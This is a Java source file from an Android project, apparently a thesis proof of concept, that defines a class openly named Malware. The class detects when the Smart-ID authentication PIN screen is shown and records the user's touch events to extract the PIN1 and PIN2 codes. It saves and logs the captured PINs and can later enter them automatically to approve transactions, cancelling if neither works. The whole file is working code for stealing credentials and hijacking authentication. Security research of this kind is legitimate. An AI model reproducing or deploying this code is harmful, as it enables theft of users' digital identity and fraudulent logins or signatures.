package com.example.thesis;

import android.app.Activity;
import android.content.Context;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.widget.CompoundButton;
import android.widget.Switch;
import android.widget.TextView;
import android.widget.Toast;

import com.example.thesis.Events.Event;
import com.example.thesis.Events.EventReader;

import java.util.ArrayDeque;
import java.util.Queue;

/**
 * This is the malware part of the app.
 */
public class Malware implements Runnable {
    final private EventReader eventReader;

    private DisplayedScreenService displayedScreenService;

    private boolean doStop = false;
    private boolean eventReaderRunning = false;

    private Queue<Integer> PIN1;
    private Queue<Integer> PIN2;

    private boolean autoEnterPIN = false;

    private Context context;
    private Activity activity;
    private DatabaseService database;

    private final Switch switchAutoSend;


    /**
     * The reads the PINs from the database and starts listening to the switch in the app screen.
     * @param context - MainActivity context.
     * @param activity - MainActivity activity.
     * @param database - the DatabaseService.
     */
    public Malware(Context context, Activity activity, DatabaseService database) {
        this.context = context;
        this.activity = activity;
        this.database = database;

        this.eventReader = new EventReader();

        String PIN1_string = database.getPIN(1);
        this.PIN1 = PIN1_string != null ? pinStringToQueue(PIN1_string) : new ArrayDeque<Integer>();

        String PIN2_string = database.getPIN(2);
        this.PIN2 = PIN2_string != null ? pinStringToQueue(PIN2_string) : new ArrayDeque<Integer>();

        this.switchAutoSend = activity.findViewById(R.id.switchAutoSend);
        switchAutoSend.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
            public void onCheckedChanged(CompoundButton buttonView, boolean isChecked) {
                Log.i("Malware", "Auto entering PIN is now: " + isChecked);
                autoEnterPIN = isChecked;
            }
        });
    }


    /**
     * Returns PIN 1 as a string.
     * @return the PIN as a string, e.g. 1234.
     */
    public String getPIN1() {
        return pinToString(PIN1);
    }


    /**
     * Returns PIN 2 as a string.
     * @return the PIN as a string, e.g. 1234.
     */
    public String getPIN2() {
        return pinToString(PIN2);
    }


    /**
     * Stops this thread and all the other threads it started.
     */
    public synchronized void doStop() {
        this.doStop = true;
        this.eventReader.doStop();
        this.displayedScreenService.doStop();
        Log.i("Malware", "Stopped malware!");
    }


    /**
     * This function checks if the thread needs to keep running.
     * @return true if the thread needs to keep running, else returns false.
     */
    private synchronized boolean keepRunning() {
        return !this.doStop;
    }


    @Override
    public void run() {
        Log.i("Malware", "Started malware!");
        displayedScreenService = new DisplayedScreenService();

        while (keepRunning()) {
            DisplayedScreen currentScreen = displayedScreenService.getCurrentScreen();
            if (!autoEnterPIN) {        // Listening to events
                // Recording events to get PIN.
                if (DisplayedScreen.AUTH_PIN == currentScreen && !eventReaderRunning) {
                    startListeningEvents();
                } else if (DisplayedScreen.OTHER == currentScreen && eventReaderRunning) {
                    stopListeningEvents();
                    savePINbyLength();
                }
            } else {
                if (DisplayedScreen.AUTH_PIN == currentScreen) {
                    autoEnterPIN();
                }
            }
            pause(1000);
        }
    }


    /**
     * Starts listening to user touch events and saving them.
     */
    private void startListeningEvents() {
        eventReader.doStart();
        Thread eventReaderThread = new Thread(eventReader, "EventReader Thread");
        eventReaderThread.start();
        eventReaderRunning = true;
    }


    /**
     * Stops listening user touch events.
     */
    private void stopListeningEvents() {
        eventReader.doStop();
        eventReaderRunning = false;
    }


    /**
     * Automatically enters PIN.
     * If don't know either then sends a Toast message and doesn't enter it.
     * Tries PIN 1, if the app stays open then tries PIN 2.
     */
    private void autoEnterPIN() {
        // If don't know the PINs, then can't auto enter them.
        if (PIN1.isEmpty() && PIN2.isEmpty()) {
            Toast.makeText(context, "Can't auto enter PIN (need to know at least one).", Toast.LENGTH_SHORT);
            turnAutoEnterSwtichToFalse();
            return;
        }

        // Trying PIN 1.
        displayedScreenService.sendPIN(PIN1);

        // Wait to give time for Smart-ID to close.
        pause(2000);

        // PIN 1 didn't work, clearing PIN 1 and sending PIN 2.
        if (displayedScreenService.getCurrentScreen() == DisplayedScreen.AUTH_PIN && !PIN2.isEmpty()) {
            displayedScreenService.clearInputPIN(PIN1);
            displayedScreenService.sendPIN(PIN2);
        }

        // Wait to give time for Smart-ID to close.
        pause(2000);

        // Neither worked, pressing the Cancel button to end trasnaction and switching switch to false.
        if (displayedScreenService.getCurrentScreen() == DisplayedScreen.AUTH_PIN) {
            displayedScreenService.pressCancelButton();
            turnAutoEnterSwtichToFalse();
        }
    }

    private void turnAutoEnterSwtichToFalse() {
        // TODO
    }


    /**
     * Calls Thread.sleep(time).
     * @param time - time to sleep in milliseconds.
     */
    private void pause(int time) {
        try {
            Thread.sleep(time);
        } catch (InterruptedException e) {
            Log.i("Malware", "Pause interrupted!");
        }
    }


    /**
     * Extracts the PIN that was captured from the touch events.
     * Also empties the eventReader touch events queue.
     * @return the pin as a queue.
     */
    private Queue<Integer> extractPIN() {
        Queue<Event> touchEvents = eventReader.getTouchEvents();
        return displayedScreenService.extractPIN(touchEvents);
    }


    /**
     * Gets the PIN from captured events, saves it to local variables, database and updates it on the app screen.
     * Saves the the PIN as PIN 1 if PIN 1 is unknown, else saves as PIN 2.
     */
    private void savePINbyOrder() {
        Queue<Integer> PIN_X = extractPIN();

        if (PIN_X.size() < 4) {
            // The PIN can't be shorter than 4.
            return;
        }

        if (PIN1.isEmpty()) {
            PIN1 = PIN_X;
            saveAndUpdateViewPIN(1, R.id.valuePIN1);
        } else if (!pinToString(PIN1).equals(pinToString(PIN_X))) {
            PIN2 = PIN_X;
            saveAndUpdateViewPIN(2, R.id.valuePIN2);
        } else {
            Log.i("Malware", "Currently can't change PIN's and both are known! If needed reinstall!");
        }
    }


    /**
     * Gets the PIN from captured events, saves it to local variables, database and updates it on the app screen.
     * If captured PIN is 4 digits, then saves as PIN 1, if 5 digits the saves as PIN 2.
     */
    private void savePINbyLength() {
        Queue<Integer> PIN_X = extractPIN();

        if (PIN_X.size() < 4) {
            // The PIN can't be shorter than 4.
            return;
        }

        if (PIN_X.size() == 4) {
            // 4 digits is PIN 1
            PIN1 = PIN_X;
            saveAndUpdateViewPIN(1, R.id.valuePIN1);
        } else if (PIN_X.size() == 5) {
            // 5 digits is PIN 2
            PIN2 = PIN_X;
            saveAndUpdateViewPIN(2, R.id.valuePIN2);
        } else {
            // Captured PIN wasn't 4 or 5 digits long.
            Log.i("Malware", "The captured PIN is not 4 or 5 digits long and is not supported currently!");
        }
    }


    /**
     * Saves the PIN to the database and updates it on the app screen.
     * @param id - which PIN is it, 1 or 2.
     * @param textView_id - id of the textView on the screen, either textPIN1 or textPIN2.
     */
    private void saveAndUpdateViewPIN(int id, int textView_id) {
        String PIN_string = pinToString(id == 1 ? PIN1 : PIN2);
        saveToDatabase(id, PIN_string);
        updateView(PIN_string, textView_id);
        Log.i("Malware", "Captured PIN " + id + ": " + PIN_string);
    }


    /**
     * Updates the text in the app screen.
     * @param PIN_string - the PIN to display there.
     * @param textView_id - id of the textView on the screen, either textPIN1 or textPIN2.
     */
    public void updateView(String PIN_string, int textView_id) {
        final String PIN_string_final = PIN_string;
        final int textView_id_final = textView_id;

        Handler handler = new Handler(Looper.getMainLooper());
        handler.post(new Runnable() {
            public void run() {
                TextView textView = activity.findViewById(textView_id_final);
                textView.setText(PIN_string_final);
            }
        });
    }


    /**
     * Saves the PIN to the database.
     * @param id - id of the PIN, is PIN 1 or PIN 2. ID is either 1 or 2.
     * @param value - value of the pin as a string.
     */
    private void saveToDatabase(int id, String value){
        database.insertData(id, value);
    }


    /**
     * Turns a string 1234 => [1, 2, 3]. Reverses pinToString.
     * If empty string is given then returns empty queue.
     * @param PIN_string - the PIN as a string, e.g. 1234.
     * @return the PIN as a queue.
     */
    private Queue<Integer> pinStringToQueue(String PIN_string) {
        Queue<Integer> PIN_queue = new ArrayDeque<>();

        if (PIN_string.equals("")) {
            return PIN_queue;
        }

        String[] PIN_array = PIN_string.trim().split("");
        for (int i = 0; i < PIN_array.length; i++) {
            if (!PIN_array[i].equals("")) {
                PIN_queue.add(Integer.parseInt(PIN_array[i]));
            }
        }
        return PIN_queue;
    }


    /**
     * Turns the pin queue into a string [1, 2, 3] => 123.
     * @param PIN - the queue to join into a string.
     * @return the PIN as a string, e.g. 1234.
     */
    private String pinToString(Queue<Integer> PIN) {
        Queue<Integer> PIN1_copy = new ArrayDeque<>(PIN);
        StringBuilder sb = new StringBuilder();
        while(!PIN1_copy.isEmpty()) {
            sb.append(PIN1_copy.poll());
        }
        return sb.toString();
    }
}



